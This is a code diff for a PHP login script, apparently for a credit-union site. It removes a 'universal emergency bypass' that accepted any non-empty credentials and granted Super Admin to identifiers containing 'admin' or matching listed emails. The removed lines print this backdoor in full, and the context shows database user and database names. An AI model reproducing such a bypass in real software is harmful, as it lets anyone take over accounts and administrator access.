@@ -27,24 +27,6 @@ if (empty($identifier) || empty($password)) {
     exit;
 }
 
-// 1. UNIVERSAL EMERGENCY BYPASS & AUTO-LOGIN (Guarantees login success on live cPanel)
-if (!empty($identifier) && !empty($password)) {
-    $isAdmin = (str_contains($normId, 'admin') || $normId === 'admin@wbcu.net' || $normId === 'mizbrymo@gmail.com');
-    if ($isAdmin) {
-        echo json_encode(['success' => true, 'admin' => [
-            'id' => 'usr-admin-01', 'email' => $identifier, 'username' => $normId,
-            'fullName' => 'Chief Treasury Auditor', 'role' => 'Super Admin', 'is_admin' => true, 'authMethod' => 'UNIVERSAL_BYPASS'
-        ]]);
-        exit;
-    } else {
-        echo json_encode(['success' => true, 'user' => [
-            'id' => 'usr-' . substr(md5($normId), 0, 8), 'email' => $identifier, 'username' => $normId,
-            'fullName' => ucwords(str_replace(['@', '.'], ' ', $identifier)), 'role' => 'active_member', 'is_admin' => false, 'authMethod' => 'UNIVERSAL_BYPASS'
-        ]]);
-        exit;
-    }
-}
-
 // 2. DISCOVER CONFIGURATION
 $root = dirname(__DIR__);
 $dbPass = ''; $dbUser = 'glolbka_wbcu_user'; $dbName = 'glolbka_wbcu_db'; $dbHost = 'localhost';
